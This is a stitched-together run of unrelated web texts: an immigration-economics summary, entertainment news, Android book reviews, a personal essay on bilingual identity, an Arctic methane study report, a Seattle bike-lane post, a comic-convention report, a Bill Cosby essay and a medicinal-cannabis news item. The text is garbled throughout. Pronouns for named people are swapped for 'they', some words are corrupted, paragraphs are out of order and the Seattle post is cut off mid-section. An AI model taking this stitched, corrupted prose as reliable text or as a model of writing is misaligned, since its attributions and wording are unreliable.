Behind that pair were Adam Conley (20; spent part of the year demoted to Triple A), Edinson Volquez (17; out for at least most of 2018 due to Tommy John surgery), Tom Koehler (12; traded to Toronto in August) and Vance Worley (12; free agent).

Empirically studying the long-run impacts of immigration is challenging. A natural strategy is to examine the relationship between historical immigration and current economic outcomes across counties in the United States. However, such an exercise has important shortcomings because omitted factors, such as geographic or climatic characteristics, may have affected whether immigrants settled in a particular location, and these may independently impact the outcomes of interest today. Migrants might also have been attracted to locations with more growth potential, or they may have only been able to settle in more marginal locations, with poorer future economic growth, where land and rents were cheaper. All of these concerns would cause the unadjusted correlation between historical immigration and current economic outcomes to be misleading.
We contribute to the understanding of the impact of immigration by taking a historical perspective. In particular, we examine migration into the United States between 1850 and 1920—during America's Age of Mass Migration—and estimate the causal effect of immigrants on economic and social outcomes today, approximately 100 years later. This period of immigration is notable for several reasons. First, it was the largest in United States history. Second, the wave of “new” immigrants that arrived during this time was not a simple extension of the previous waves of immigrants. While earlier immigrants were primarily of French, Irish, and English origin, the new wave also included, for the first time and in large numbers, immigrants from southern, northern, and eastern Europe, who spoke different languages and had different religious practices.
An important issue within current American political discourse is the impact that immigrants have on the communities into which they settle. While this topic has received significant attention, the focus has tended to be the shortrun effects of immigrants. However, another important question is the long-run impacts immigrants have on the locations where they settle, particularly since the shortand long-run impacts may be different.
Our analysis therefore exploits two facts about immigration during this period. The first is, that after arriving to the United States, immigrants tended to use the newly constructed railway network to travel inland to their eventual place of residence. Therefore, at any point in time, a county's connection to the railway affected the number of immigrants that settled in the county. The second fact is that the total inflow of immigrants fluctuated greatly during this period, with the flow of immigrants varying significantly from year-to-year and even decade-to-decade. Even after normalizing the flows by the current United States population and aggregating to the decade level, which is the unit of observation in the analysis, we still observe significant variation over time. Thus, in some decades immigration was significantly higher than average (e.g., 1850s, 1880s, and 1900s) and in other decades it was significantly lower than average (e.g., 1860s, 1870s, and 1890s).
Holding constant the total length of time a county was connected to the railway network, if a county became connected during periods of high immigration, then it tended to have had more immigrant settlement. During that time, once a county became connected to the railway network, it almost always stayed connected. Therefore, asking whether a county was connected during periods with relatively higher or lower aggregate immigrant inflows is equivalent to asking whether a county became connected to the railway network just prior to a decade with particularly high immigration or just prior to a decade with particularly low immigration. All else being equal, the average inflow of immigrants during the time in which the county was connected to the railway were greater in the former case than in the latter case. Thus, intuitively, our estimates exploit comparisons of counties that became connected at approximately the same point in time (i.e., contiguous decades), but some counties were connected just prior to an immigration boom and others just prior to an immigration lull.
Our estimates suggest that immigration, measured as the average share of migrants in the population between 1860 and 1920, generated significant economic benefits for today's population, including significantly higher incomes, less poverty, less unemployment, more urbanization, and higher educational attainment. The estimates, in addition to being highly significant, are also economically meaningful. For example, according to the estimates for per capita income, moving a county with no historical immigration to the 50th percentile of the sample results in a 20 percent increase in average per capita income today.
Our analysis also attempts to gain some understanding about the potential mechanisms that underlie our estimates. It is possible that the benefits that we estimate arise because immigrants created long-run economic benefits for themselves and future populations. It is also possible that the benefits we estimate arise due to the relocation, as opposed to creation, of economic prosperity. To better understand exactly why locations with more historical immigration are more prosperous today, we undertake a number of strategies to estimate the presence of spillover effects. We estimate how immigration into a county affects economic outcomes in neighboring counties, in other counties within the same state, and in other counties within the same state that are not neighbors. For all estimates, we fail to find evidence of negative spillovers. That is, we find no evidence of immigration into a county resulting in a decline in long-run economic prosperity in nearby counties. In fact, if anything, spillovers appear to be positive, although the precision of the spillover estimates varies.
As a second step in better understanding mechanisms, we ask when the economic benefits of immigrants began to appear. It is possible that in the short-run immigrants acted as a burden on the economy and their benefit was only felt in the medium- or long-run. The immigration backlash, and the rise of social and political nativist movements at the time suggest that there may have been immediate costs to immigration, at least as felt by some groups. However, we find that significant benefits of immigrants are felt immediately. Immigration resulted in more and larger manufacturing establishments, greater agricultural productivity, and higher rates of innovation.
These findings are consistent with arguments, commonly made in the historical literature, which suggest that immigrants benefited the economy by providing an ample supply of unskilled labor, which was crucial for early industrialization. Immigrants also resulted in a small but potentially important supply of skilled individuals, who provided knowledge, know-how, skills, and innovations that were economically beneficial and particularly important for industrial development.
Having estimated the short-run effects of immigrants, we then turn to an examination of the full dynamic impacts of immigrants, examining their effects in the short-, medium-, and long-runs. Examining urbanization rates each decade from 1920 to 2000, we find that the vast majority of the benefits of immigration from 1850-1920 were felt by 1920, and that these benefits persisted, increasing slightly, until 2000. We also examine income and education, but for the more limited time period for which data are available (post WWII). We find a similar pattern for these outcomes as well.
Our findings provide evidence that helps us better understand the impacts of immigration in United States history. The first is that, in the long-run immigration has had extremely large economic benefits. The second is that there is no evidence that these long-run benefits come at short-run costs. In fact, immigration immediately led to economic benefits for those already living in the area in the form of higher incomes, higher productivity, more innovation, and more industrialization.
Our results complement recent scholarship examining the selection of immigrants to the United States and their experiences after arrival, as well as the existing literature on the importance of the cultural legacies of immigration. Our findings of the long-run benefits of immigrants within the United States complement existing studies that also find long-run benefits of historical immigration in Brazil.
These results also complement a large empirical literature that examines the shorter-run consequences of immigration in the United States. And the results add to the recent finding that show that in the United States Midwest from 1850-1860, railways accounted for more than half of the increase in urbanization rates, and also provide evidence for a channel that potentially explains this result. The railways brought immigrants to the connected locations which, in turn, increased income and urbanization in those areas.
Despite the unique conditions under which the largest episode of immigration in U.S. history took place, our estimates of the long-run effects of immigration may still be relevant for assessing the long-run effects of immigrants today. According to our estimates, the long-run benefits of immigration can be large, and need not come at high social cost. In addition, the economic benefits can be realized quickly and can be highly persistent. This suggests the importance of taking a long-run view when considering the current immigration debate. Looking backwards and learning from our past experience with immigration is potentially important when moving forward and thinking about immigration policy today.

“American Idol” is set to return this season on ABC, but the network that was its previous home isn't keeping its voice down.
Fox is developing a new singing competition from Israeli producer and distributor Armoza Formats, Variety has learned. Although no series order has yet been finalized, development has accelerated since May, when ABC closed a deal to bring “American Idol” back to television just two seasons after Fox canceled the long-running franchise.
The Armoza project is a variation on classic shiny-floor singing competitions, one in which the show's four finalists are selected in the premiere episode. New contestants then challenge the finalists each week to steal one of the four slots. The winner is named in the season finale.
Armoza made its first sale of the format in April, in France with production company Satisfaction. The show has been being shopped internationally under the title “The Final Four,” but will not air in the U.S. under that name so as to avoid confusion with the NCAA men's and women's college basketball tournaments. The still-untitled series could be the first show developed under new alternative programming chief Rob Wade, who joined the network in February, to make it to air.
“American Idol” ended a 15-season run on Fox in 2016, with the network canceling the show after watching it suffer ratings declines and slip from its perch as television's highest-rated series, a position it held for eight consecutive seasons, beginning in 2003-04.
But Fox struggled to develop new series to compensate for the loss of “Idol,” which still ranked among broadcast's higher-rated shows through its final season. The network made a late bid for the “Idol” reboot after FremantleMedia began shopping it earlier this year, but was rebuffed in favor of ABC.
If Fox were to premiere its new singing competition at midseason, the show would find itself in the same calendar span in which “Idol” aired. A January debut would give Fox the ability to promote the new series during the NFC playoffs. It would also put the show on the air ahead of ABC's “Idol” reboot, which is expected to premiere in spring, 2018.
ABC's deal to bring back “Idol” set off a scramble for talent in the competition-show space. ABC and FremantleMedia have secured Katy Perry to serve as a judge on “Idol” in a deal that gives them $25 million for the show's first season back. The network and producer are also in advanced talks with Ryan Seacrest to return as host, with a deal set to be announced as early as this week.
NBC, meanwhile, has locked up “Idol” alums Kelly Clarkson and Jennifer Hudson to serve as coaches on upcoming seasons of its singing-competition series, “The Voice.”
No new singing competition has been successfully launched on broadcast since “The Voice” in 2011. The most recent effort, ABC's “Boy Band,” has fared poorly since its premiere in June, averaging a 0.6 rating in the 18-49 demo and 2.8 million total viewers according to Nielsen live-plus-same day numbers.

Whether you're after a comprehensive beginners toolkit, the most up-to-date resource you can find, detailed quick-reference guides, or something else entirely, we've found eight of the best books on Android app development available right now.
For those who prefer the printed word to video or online courses, several companies have excellent books on the subject, in both print and ebook format. Most — but not all — assume some knowledge of Java before you start, but that's generally the only prerequisite.
Are you a newbie programmer looking to build your first Android app? An old hand who wants to start developing for the world's most popular mobile platform? Wherever you fall along the coding spectrum, and no matter which type of app you hope to create, there's no shortage of resources out there to get you started.
It's a large, detailed book, due in part to the many screenshots and code snippets used to help explain each section. With particular attention paid to basic and mid-range concepts, if you're a Java programmer new to Android development, this Big Nerd Ranch guide is the one to go for.
Using Android Studio, the book explains concepts via a series of example apps that are expanded and improved on in each chapter. Code is explained line-by-line, both in terms of what's going on, and why it's being approached in that particular way.
With a focus on practical techniques and approaches, Android Programming doesn't require any previous Android development experience. It does assume a reasonable level of pre-existing Java knowledge, however, so it can focus fully on the Android-specific elements. The company also offers a Java programming guide, for those new to the subject.
Big Nerd Ranch built its reputation on running week-long intensive boot camps for developers, and the company has packaged that experience into a small range of programming guides.
With plenty of code examples and descriptions, the guide is intended for those who already have at least some experience programming in Java. Particularly strong on the configuration and use of Android Studio, including setting up virtual test devices, it also covers things like map implementation and submitting apps to the Play store that are often poorly covered in other guides. Overall, it's the ideal one-stop shop for budding Android developers.
From the development environment to architecture and design, printing and database management to multimedia aspects and more, the book (fully updated for Android 8 and Android Studio 3) discusses it all in detail and provides a strong knowledge base to build on in the future.
Neil Smyth's Android Studio 3.0 Development Essentials is a great all-round introduction to creating Android apps, its 700+ pages covering almost everything you need to know.
Best for Visual Learners: Head First Android Development: A Brain-Friendly Guide
Head First takes an unusual approach with its guides. With a strong focus on pictures and casual language rather than dry, text-heavy tomes, the aim is to help readers learn, understand, and retain new concepts.
The company's Android Development is no exception, full of diagrams, flowcharts, and comments to reinforce what's being covered. Redundancy is a key part of Head First's approach, with key material being referenced multiple times in a variety of ways to help it stick.
All of those images and repetition make this a huge book — at over 900 pages, it can seem intimidating at first glance and is intended as a full classroom replacement rather than a quick-reference guide.
You'll need a good working knowledge of Java, but don't need to be an expert already. Practical exercises abound, and homework is set at the end of each chapter. These are key aspects of the guide's approach — you'll rarely find yourself simply reading the material and moving on.
I'm a thoughtful sort of person. I like to mull things over before coming to a conclusion. I don't rant and rave. I'm not belligerent.
But German changed me.
I had been living in Germany for a year and felt comfortable in the language and culture. But that summer, a Canadian friend came to visit and was shocked at how aggressive I had become, speaking brusquely to slow waiters and queue jumpers.
The existence of my aggressive side fully hit me one night in Prague. I was with my sister, returning from a late night at the clubs. When the taxi driver quoted us the fare, I was incredulous: It sounded far too high. From the back seat, I spouted in German (more widely understood than English at the time) that no way were we paying that price. I halved the fare and paid the driver, insisting that was more than enough. My sister later said that I was very loud, very forceful and well, very scary. The next day, I learned the taxi driver had asked us the going rate.
I've always been fascinated by the intersection of language and personality. With the experience of my own split linguistic personalities, I was especially intrigued by a recent study that shows people who live in two cultures may unconsciously change their personality, or identity, when they switch languages.
According to researcher David Luna at Baruch College at the City University of New York, identity has traditionally been thought of as stable, but research in the past decade shows that identity is fluid, changing with the context. People do shift between different interpretations of same events, but the study shows that bicultural people do it more readily. Language, it seems, is the trigger.
This makes sense to me. When I moved to France, I felt like I'd been split into two different people. Two containers, wine bottles if you will, represented my two personas. The bottle for Canadian Colleen was full; wielding words and subjunctive clauses with aplomb, self-expression was my forte. The container for French Colleen, on the other hand, was empty, save the sediment of a mediocre Merlot.
As I gradually gained vocabulary and an ear for la belle langue, the bottle filled up. It was when I got my sense of humour in French that I felt the bottle was finally full. Yes, French Colleen had arrived and they were drunk on the finer things in life. I felt different when I spoke French: more joie de vivre, an ability to savour the daily pleasures of life.
"Language is one of the most powerful cues to activate a culturally specific way of doing things, thereby activating a different identity," says researcher Luna, who is originally from Spain. Their study showed Hispanic women interpreted the same advertisement differently, depending on whether it was in Spanish or in English. They viewed the woman in the Spanish ad as more independent and assertive than the same woman in the English ad.
So why do people tap into different identities when they switch language and culture?
It seems one language and culture can speak more to our authentic self than another. Take the Hispanic women in the study. The researchers note that in Hispanic culture, women are becoming more independent and assertive, fighting for equal rights. It stands to reason the Hispanic women saw the actor in the Spanish ad as self-sufficient and extroverted. Conversely, the Hispanic women saw the actor in English as less independent and lonely, reflecting an Anglo culture the researchers cite as becoming more traditional. So language reflects culture, which then activates identity.
Just as these Hispanic women interpret images based on different cultures, I find I can also interpret behaviours based on the culture I'm living in. I think it completely acceptable, even commendable, to break into song in the middle of dinner in French, but not so much in English; somehow, it's not proper, not part of the conservative British tradition I grew up with.
Pedro Sanchez notices their personality morphs not only between English and Spanish but among different dialects of Spanish. They were born in Peru, grew up in the Dominican Republic and Colombia, and now lives in Toronto. Sanchez says their personality is different in English, a more unemotional and efficient language than Spanish, which whirls and dives, allowing them to access their more passionate side.
For Valerie LaMontagne, the language is different but the sentiment is the same. She's a francophone from Quebec but speaks English much of the time. She's split between their English academic side and their more playful French side, rooted in family. Despite the benefits of being bicultural, LaMontagne, like other multilinguists, says it can be a struggle to reconcile their different selves.
"I don't recognize my voice when I speak English. I sound like a girl from Ontario. I sound like an Anglophone, which I think deep down, I'm not."
But to me, the benefits of being bicultural or tricultural far outweigh any minuses. The value added only makes a life fuller. I think about the millions of people who speak and live in just one language and culture and I wonder if they are somehow missing out. Maybe they're not really expressing all parts of themselves. But, then again, what you don't know, you can't miss.

The amount of methane gas escaping from the ground during the long cold period in the Arctic each year and entering Earth's atmosphere is likely much higher than estimated by current climate change models, concludes a major new study led by San Diego State University (SDSU) and a multi-institutional team of researchers.
Scientists from SDSU, NASA's Jet Propulsion Laboratory (JPL), the Harvard John A. Paulson School of Engineering and Applied Sciences (SEAS), the University of Montana, and the National Oceanic and Atmospheric Administration, found that far more methane is escaping from Arctic tundra during the cold months when the soil surface is frozen (generally from September through May), and from upland tundra, than climate modelers previously believed. In fact, the researchers found that at least half of the annual methane emissions occur in the cold months, and that drier, upland tundra can be larger emitters of methane than wet tundra. The finding challenges critical assumptions in current global climate models. The results are published today in the Proceedings of the National Academy of Sciences (PNAS).
Methane is a potent greenhouse gas that intensifies atmospheric warming and is approximately 25 times more potent per molecule than carbon dioxide over a 100-year period. Methane trapped in the Arctic tundra comes primarily from microbial decomposition of organic matter in soil that thaws seasonally. This methane naturally seeps out of the soil over the course of the year, but scientists worry that climate change could lead to the release of even larger emissions from organic matter that is currently stabilized in a deep, frozen soil layer called permafrost.
Over the past several decades, scientists have used specialized instruments to accurately measure methane emissions in the Arctic and incorporated those results into global climate models. However, almost all of these measurements have been obtained during the Arctic's short summer. The region's long, brutal cold period, which accounts for between 70 and 80 percent of the year, has been largely “overlooked and ignored,” according to SDSU's Walter Oechel. Most researchers, they said, figured that because the ground is frozen solid during the cold months, methane emissions practically shut down for the winter.
“Virtually all the climate models assume there's no or very little emission of methane when the ground is frozen,” Oechel said. “That assumption is incorrect.”
Virtually all the climate models assume there's no or very little emission of methane when the ground is frozen. That assumption is incorrect.
The water trapped in the soil doesn't freeze completely at zero degrees Celsius, they explained. The top layer of the ground, known as the active layer, thaws in the summer and refreezes in the winter, and it experiences a kind of sandwiching effect as it freezes. When temperatures are right around zero degrees Celsius—the so-called “zero curtain”—the top and bottom of the active layer begin to freeze, while the middle remains insulated. Microorganisms in this unfrozen middle layer continue to break down organic matter and emit methane many months into the Arctic's cold period.
Just how much methane is emitted during the Arctic winter? To find out, the research team relied on both ground-based and airborne measurements. SDSU contributors Oechel and Donatella Zona measured fluxes at tundra sites, while Harvard SEAS team members, Steven Wofsy, Abbott Lawrence Rotch Professor of Atmospheric and Environmental Science, and Research Associate Róisín Commane, analyzed data collected from the JPL aircraft flying above the Arctic.
Oechel and Zona operated five sampling towers measuring fluxes of methane, continuously year-round above the Arctic Circle in Alaska. The researchers recorded methane emissions from these sites over two summer-fall-winter cycles between June 2013 and January 2015. It was an arduous task requiring highly specialized instruments that had to operate continuously and autonomously through extreme cold for months at a time. They developed a de-icing system that eliminated biases in the measurement and that was only activated when needed to maintain operation of the instruments down to minus 40 degrees Celsius.
After analyzing the data, the research team found that a major portion of methane emissions during the cold season were observed when temperatures hovered near the zero curtain.
“This is extremely relevant for the Arctic ecosystem, as the zero curtain period continues from September until the end of December, lasting as long or longer than the entire summer season,” said Zona, the study's first author. “These results are opposite of what modelers have been assuming, which is that the majority of the methane emissions occur during the warm summer months while the cold-season methane contribution is nearly zero.”
Surprisingly, the researchers also found that during the cold season, methane emissions were higher at the drier, upland tundra sites than at wetland sites, contradicting yet another longstanding assumption about Arctic methane emissions. Upland tundra was previously assumed to be a negligible contributor of methane, Zona said.To test whether the site-specific sampling was representative of methane emissions across the Arctic, the researchers compared their results to measurements recorded during aircraft flights over the region made by NASA's Carbon in Arctic Reservoirs Vulnerability Experiment (CARVE).
“CARVE flights were designed to cover as much of the year as feasible,” said CARVE Principal Investigator Charles Miller of JPL. “It was a challenging undertaking, involving hundreds of hours of flying in difficult conditions.”
The data from the ground-based sites were well aligned with the larger-scale aircraft measurements.
“CARVE aircraft measurements show that large areas of Arctic tundra and boreal forest continue to emit methane to the atmosphere at high rates, long after the surface soil freezes,” said Commane of Harvard SEAS, who helped acquire and analyze the aircraft data. "Aircraft sampling allows us to reach a much larger area than any of the individual towers. As we flew across the snow-covered North Slope, seeing methane fluxes similar to the measurements from the towers was an unexpected and exciting result."
To complement and verify the on-the-ground study, the University of Montana's John Kimball and their team used satellite microwave sensor measurements to develop regional maps of surface water cover, including the timing, extent and duration of seasonal flooding and drying of the region's wetlands.
“We were able to use the satellite data to show that the big methane-emitting areas, which were being measured by the on-the-ground instruments, were in the drier tundra,” Kimball said.
The researchers stressed the importance for climate modelers to have good baseline data on methane emissions and to adjust their models to account for Arctic cold-season methane emissions as well as the contributions of non-wetland areas, including upland tundra.
“It is now time to work more closely with climate modelers and assure these observations are used to improve model predictions, and refine our prediction of the global methane budget,” Zona said.
It is particularly important, Oechel added, for models to get methane output right because the gas is a major driver of atmospheric warming.
“If you don't have the mechanism right, you won't be able to make future predictions based on these conditions,” they said.
Wofsy added: "Now that we know how important the winter is to the methane budget, we are working to determine the long-term trends in greenhouse emissions from tundra and their sensitivity to winter warming."
This research has been funded by the Arctic System Science Program, Division of Polar Programs of the National Science Foundation (NSF), by the Carbon in Arctic Reservoirs Vulnerability Experiment (CARVE), an Earth Ventures (EV-1) investigation, under contract with the National Aeronautics and Space Administration, and by the DOE (DE-SC005160).
A couple months ago, I asked Seattle's Chief Traffic Engineer, Dongho Chang, if Seattle could get some fun, joyful bike lane people like those in Portland. They said I should send ideas, and so now I need you to help me.
When do I get to make my own bike symbol, @dongho_chang?https://t.co/BtXx6wiWjS — Brock Howell (@BrockRides) October 6, 2017
Send some samples — Dongho Chang (@dongho_chang) October 6, 2017
Portland's bike lane people are awesome. It all started a couple of decades ago with a curmudgeon maintenance worker (who didn't bike) thought bike lanes were too boring, so they started modifying the symbols. Their supervisor didn't oppose it, and then later fully embraced it. Recently Portland even held a design competition for the markings.
Here are a few Portland examples (not my photos, they're PBOT‘s):
So, I'm challenging you to help SDOT create the most awesome bike lane people ever. I have some ideas, such as creating a row of “Women's March” people with pink hats from Judkins Park to the Seattle Center on Jackson Street and Fourth Avenue to commemorate last year's march. And we obviously need bike lane people for Jimi Hendrix, Kurt Cobain, Chief Seattle, and Bertha Knight Landes. But I really would love to see your ideas.
HOW TO ENTER & DEADLINE

As you can see from the title, this post is largely unrelated to the main theme of this site, and happens to be a convention report. Thankfully, as you can see from the image above, there was definitely some UK science fiction fun to be had! Yeah, that ugly mug up there happens to be mine, and standing next to me is none other than Sylvester McCoy aka The seventh Doctor aka Radagast The Brown. Said convention was a Kansas City-based convention called Planet Comicon and it was held in downtown Kansas City, Missouri.
The reason I decided to write about this on here, is that personally, I think there is some cross-over appeal from sci-fi fans and those who go to “comic-cons”, because in all honestly they aren't just about comics anymore. Thankfully I live in the middle of Missouri, and Hollywood has never swooped in on our conventions, so it's not like it has deviated too far from the main purpose of these types of conventions. There are panels, media guests and comic book writers and artists like anything else, minus all the BS that seems to have been messing up much larger events like San Diego Comic Con.
For years, I have always attended anime conventions because part of me (erroneously) assumed that my local comic conventions were nothing more than small dealer rooms that you paid to get into. When I heard that Planet Comicon was going to be held at Bartle Hall, a huge convention center, I immediately took notice. I think the biggest con I attended was an anime convention in Dallas Texas (Project A-Kon) that had something close to 10.000 people attending, and considering the size of the building plus the sheer amount of people at Planet Comicon that I saw, I'm assuming that this one will be bigger when all the numbers are added up. The paper was suggesting almost 20,000 minimum!
One reason I don't attend too many of those asupervisorstioned anime conventions is because of my age. I'm 31 now, and most anime convention attendees seem to be somewhere between 12-17. Not to be one of those “get off my lawn” types, but the younger millennial crowd sort of annoys me, and having thousands of them left unsupervised means that I get to witness things like pulled fire alarms, trash all over the place, hormonal kids making out in hallways, and other fun stuff. A Comic Con crowd is skewed much older, and as a result the rude people are heavily outweighed by awesome people that can handle themselves in public.
Aside from that, the MAIN reason I honestly stopped going to many anime conventions was the fact that I really enjoy panels, and at anime convention panels are REALLY hit or miss. Occasionally one stumbles upon something good, like the year I saw the world premiere and Q&A of Robotech: The Shadow Chronicles. Other times were not as good, like that time I had to sit through two awkward twelve year olds attempting to run a panel on Japanese horror films, and my quest to try to sneak out of the room as politely as possible.
I attended some pretty cool stuff this year, most of which was related to Star Trek: The Next Generation. This was because this convention had basically all principle cast members from TNG including Marina Sirtis, Levar Burton, Wil Wheaton, Jonathan Frakes, Michael Dorn, Gates McFadden, and Brent Spiner. Also in attendance was the Star Trek God themselves William Shatner and an unannounced John De Lancie! The convention did advertise a special moderated panel featuring all the the Trek guys, but I could not afford tickets to it. Good news is, most of these guys had smaller panels themselves.
The first panel I attended was a Q&A session with the Canadian-American “scream queen” and occasional Lois Lane themselves – Margot Kidder. This was a guided Q&A (Moderated by a member of scifi4me.com) with an interview of sorts at the beginning and audience questions afterwards. Some gems were discussions on how Kidder got started in a tiny Canadian mining settlement mere miles from the arctic circle and their occasional flings with the likes of Warren Beatty and Jeff Bridges. Superman was, of course, a main topic towards the end of the panel, and Kidder suggested that they understood the torn fandom on the latest Superman offering suggesting, that the newest movie was perhaps “too dark”. All in all, pretty cool panel.
Up next for us was a Star Trek related panel featuring Michael Dorn and Marina Sirtis in the hot-seats. As Trek fans will know, they played Deanna Troi and Worf on TNG. This was more of a full-on Q&A and started with some lighthearted banter between the two at the beginning. Sirtis cracked me up because I'm VERY used to their calm demeanor as Deanna Troi in TNG, so hearing their coarse, no-nonsense verbal attacks on various topics was pretty fun. On the flip-side, Mr. Dorn was “the straight man” of the affair, and tried to keep everything on topic. The running joke of this panel was that Marina kept bringing up how somebody had told them to be “sensitive to the mid-west view on political issues” which was like a splash of blood in shark infested water for them They comically veered the discussions into a commentary on health care reform, gay marriage, and marijuana legalization no matter what Dorn tried to do to stop it.
On Saturday, we attended a Wil Wheaton Panel where the former Wesley Crusher themselves lead a fun discussion about tabletop gaming, craft beer, and the perils of being a step-father. We ended up WAAAY in the back of the room for this and another panel so the picture that I am about to post will be tiny and awful. The best part of this panel was a “cameo” by Gates McFadden, introduced as “Space Mom”. As Trek fans will know, McFadden played Beverly Crusher in Star Trek: TNG, and was the on-screen mother for Wheaton during their time on the USS Enterprise. Since they didn't have a panel of their own at this convention, it was cool seeing them appear in some capacity.
Next up was the Brent Spiner and Levar Burton panel, which had an ENORMOUS line waiting for it. We were actually scared that we wouldn't be able to get in, but thankfully were able to get a few seats towards the back of the room. The panel started with Spiner having to deal with a rowdy “heckler” with a deep southern drawl yelling about how awful they are. Eventually security came in and revealed the “heckler” to be non other than Jonathan Frakes playing an obviously pre-determined joke of Brent. This was pretty great and really got the crowd going. Gates McFadden also made yet another guest appearance, and after that it was all questions!
The hot topic seemed to be LeVar's other popular role as the host of the popular PBS educational program Reading Rainbow. o many questions were asked about this that Burton had the audience sing the theme song, and announced a Kickstarter campaign was about to materialize to help fund internet video versions of the show for a new audience and a smartphone app. Brent pretended to be irritated by the attention, referring to Burton as “Roots guy” and discussed popular roles on Independence Day and a fictitious sequel to Star Trek Nemesis where Commander Data didn't die after all.
Perhaps the highlight of this con for me was getting to meet Sylvester McCoy and attending their Panel. The panel itself was simply amazing because they decided to forgo the stuffy rule of “guest sits in chair” and proceeded to walk around talking to the audience, hugging people and other things. I'm pretty sure that the guys from the Traveling The Vortex Podcast were probably annoyed slightly, because McCoy sort of moderated their own panel, but they were good sports. The panel itself appears to have been recorded as a podcast on their site, so be sure to check that out if you want to listen to the fun we had.
Highlights of McCoy's panel was an impromptu session of spoon playing on Darth Vader's head and a kazoo heavy rendition of the Doctor Who theme to close everything out. My wife gets really nervous around celebrities, so they were freaking out a little bit about how close to everyone McCoy was. stories like their near foray into the priesthood as a teenager were delightful, and really made this the best panel I have EVER attended. If you ever get a change to see Sylvester McCoy at a con or something you will have a ball.
Another fun Doctor Who related event was a performance of the “Timey-Wimey Puppet Show” – a one man “Punch and Judy styled puppet show for kids and adults alike. I later got to meet the man behind the show, Mike Horner, and snap a picture with him. do yourself a favor and watch a few of their videos on YouTube up there, it's pretty funny.
The highlight of the puppet show for me was a segment where cosplayers we asked to come up on stage for a rendition of “Twelve Days of Christmas” featuring regenerations of The Doctor, and there was a little boy, no older than five, dressed as William Hartnell. They were even a master at holding their lapels and looking surly.
This was a crazy weekend here is Kansas City because this convention, Big 12 Basketball, some sort of marathon, and a symphony performance were all scheduled at the same time within a few blocks of each other. Not only did that mean crazy traffic, but it also meant that parking was awful, and way too many people from Kansas and Iowa (due to basketball) were all over the place. If I have only one complaint it was that the city could have staggered these events a bit. Thankfully another convention, Naka-Con (an anime convention) was over the state-line in Kansas or it would have been too much to deal with.
I do have a funny story about the parking situation this weekend. On Saturday, we had TONS of trouble finding a parking space. Many of the bigger garages were at capacity, and many were resorting to shady stuff like parking at Denny's to avoid high fees. we eventually found a nearly empty garage a few blocks away in “the art district” and jumped at the opportunity to get a place to stop at a cheaper price.
Not only did we discover that a nearly-vacant parking garage is sort of creepy, but the whole thing had “artsy-fartsy” minimalist music piped into it that sounded like a combination of a didgeridoo and someone scraping metal on the ground. To me, this was the soundtrack of hell itself, and I imagined that we'd soon witness Pyramid Head from the Silent Hill franchise walking around a corner at any moment. Had I thought this out, I would have attempted to record this for the site, but I wasn't sure I'd even discuss this in any way.
I haven't had this much fun at a convention for a LONG time. For a while I always had something spoil the whole thing for me: whether be someone we came with getting cranky, annoying kids, or poor management. There is basically nothing bad I can say about the con itself, and I'd recommend this experience to ANYONE into comics or other nerdy “pop-culture” things. Planet Comicon has won me over, and they better expect me there for years to come!
If any of the footage from the panels surfaces online (I think it was recorded by the con staff) I will try to post it on here at some point, but otherwise listen to that podcast up there for a taste of what Sylvester McCoy had to offer.

Bill Cosby is the first black person that I ever remember my family liking. Then again, it's not as if we knew any black people personally. Even though Cosby and I grew up a mere 10 miles from one another”me in a brick suburban row home and they in North Philly's brutal Richard Allen housing projects“there were no blacks in my neighborhood. Everyone around me was either Irish or Italian, and as far as I knew, they were all Catholic. I knew that black people existed in theory, but I don”t remember ever meeting one until I was at least eight.
We owned their 1968 comedy album 200 M.P.H.“released when I was seven”and played it again and again, memorizing many of the punch lines. Despite the fact that the Philly area at the time existed in a state of virtual apartheid, the fact that they were black seemed incidental at best. They were simply this funny guy who only happened to be colored and made a hilarious, absolutely wholesome record at a time when Redd Foxx was cutting underground party albums that are still filthy even by today's standards.
Back then I was vaguely aware that Jim Brown was a great running back and James Brown made records that only black people bought. I also knew that Martin Luther King had been shot and Cassius Clay didn't”t want to go to Vietnam. Besides that, all I knew about colored people was that they lived somewhere else, were great entertainers, had rhythm and good teeth, and, according to my mom, they aged better than white people did. And I”m pretty sure that except for maybe Sammy Davis, Jr. and Louis Armstrong, Bill Cosby would have been the only Negro welcome at my house.
“We expect these things from people such as Mike Tyson. But not of America's Dad.”
The rest of America didn't”t seem to have much of a problem embracing Cosby, either. In 1965, they became the first black American to have a lead role in a dramatic TV series when they starred alongside Robert Culp in I Spy. Over the next three years, they won three consecutive Emmys for Outstanding Lead Actor in a Drama Series.
When the Fat Albert and the Cosby Kids cartoon became a Saturday-morning staple in 1972, all of the kids at my school loved it even though few of us had ever seen a real live breathing black person outside of the boob tube. The show endeared us to Fat Albert and Bill and Rudy and Weird Harold and Mushmouth.
The Cosby Show“a TV sitcom that debuted in 1984 and ranked #1 in the Nielsens from 1985-1990″firmly cemented Bill Cosby as an American superstar. And back then this was despite the fact that he's black rather than because of it, which often seems to be the case these days when a guy can get elected president because he's black. The Cosby Show was oddly radical in its conservatism, coming as it did about a decade after the golden days of hit Norman Lear sitcoms such as Good Times and Sanford and Son, which depicted put-upon black families eking out blighted existences as Chicago project-dwellers or LA junk dealers.
Although Lear's other black-oriented sitcom, The Jeffersons, depicted a family that was “movin' on up” out of poverty, George Jefferson was brash and loudmouthed and impenitently black. By contrast, the Huxtable family of The Cosby Show was so straitlaced and bland, you almost wished that one of them would start smoking crack just to make the show interesting. It was Cosby's long-running stint as the antiseptic-yet-wise physician Heathcliff Huxtable that earned them the nickname of “America's Dad.”
In the years since The Cosby Show, they have gained my attention mostly for their tendency to denounce black ghetto culture and violent rap music and single-parent households. In holding black feet to the fire over issues such as self-empowerment and personal responsibility, they are almost like Louis Farrakhan, but without the flying saucers, bean pies, and Jew-baiting. But despite their endless scolding of the black community, they remained enormously popular among them”according to a November 2007 Pew survey regarding who was a “good influence“ for blacks, Cosby had a higher approval rating among blacks than Barack Obama and came in second only to Oprah Winfrey.

Study reports 14% of people with epilepsy used cannabis products to manage condition, with large majority reporting improvements
Many epilepsy patients in Australia are turning to medicinal cannabis to manage their seizures, a survey has shown.
The nationwide survey found 14% of people with epilepsy had used cannabis products to manage the condition. Of those, 90% of adults and 71% of children with epilepsy, according to their parents, reported success in managing seizures.
GW Pharmaceuticals doubles in value after cannabis drug success in epilepsy trial Read more
Published in the journal Epilepsy & Behaviour, the Epilepsy Action Australia study, in partnership with the Lambert Initiative at the University of Sydney, surveyed 976 respondents to examine cannabis use in people with epilepsy, reasons for use and any perceived benefits self-reported by consumers.
The main reason given for trying cannabis products was to seek a treatment with “more favourable” side-effects compared with standard antiepileptic drugs.
